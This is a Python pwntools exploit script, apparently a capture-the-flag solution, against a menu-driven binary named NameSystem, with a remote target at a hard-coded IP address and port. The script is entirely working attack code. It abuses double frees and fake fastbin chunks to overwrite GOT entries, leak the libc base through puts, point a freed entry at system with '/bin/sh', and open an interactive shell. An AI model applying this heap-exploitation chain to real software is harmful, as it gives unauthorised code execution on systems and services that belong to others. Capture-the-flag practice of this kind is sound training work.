#coding=utf-8
from pwn import *
local = 1
exec_file="./NameSystem"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("183.129.189.62",16605)

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *0x000000000400A56
    b *0x0000000000400B74
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))
def menu(idx):
    a.sendlineafter("Your choice :\n",str(idx))
def add(size,content):
    menu(1)
    a.sendlineafter("Name Size:",str(size))
    a.sendafter("Name:",content)

def delete(idx):
    menu(3)
    a.sendlineafter("The id you want to delete:",str(idx))

ptr_addr = 0x6020A0
ptr_end = 0x602138
fake_chunk_addr = 0x601ffa
for i in range(15):
    add(0x28,'A\n')
add(0x38,'\n')#15 
add(0x58,'\n')#16 0x603310
add(0x58,'\n')#17 0x0000000000603390
add(0x58,'\n')#18 0x0000000000603400
add(0x58,'\n')#19 0x0000000000603470
delete(0)
delete(19)
delete(17)
delete(17)
add(0x38,'\n')
add(0x38,'\n')
add(0x38,'\n')
delete(0)
delete(19)
delete(17)
delete(17)
add(0x60,'\n')
add(0x60,'\n')
add(0x60,'\n')
delete(0)
#delete(0)
delete(19)
for i in range(9):
    delete(0)
delete(12-4)
delete(12-4)
add(0x58,p64(fake_chunk_addr)+'\n')
add(0x58,'\n')
add(0x58,'\n')
add(0x58,'A'*6+p64(0x41)+p64(elf.plt["puts"])[:6]+'\n')
fake_chunk_addr = 0x60208d
add(0x60,p64(fake_chunk_addr)+'\n')
add(0x60,'\n')
add(0x60,'\n')
add(0x60,'A'*3+p64(0x602020)[:6]+'\n')
delete(0)
libc_base=u64(a.recvuntil("\n",drop=True)+'\x00\x00')-libc.symbols["puts"]
fuck(libc_base)
fake_chunk_addr = 0x000000000602008
add(0x38,p64(fake_chunk_addr)+'\n')
add(0x38,'\n')
add(0x38,'/bin/sh\n')
add(0x38,p64(libc_base+libc.symbols["system"])[:6]+'\n')
delete(17)

a.interactive()






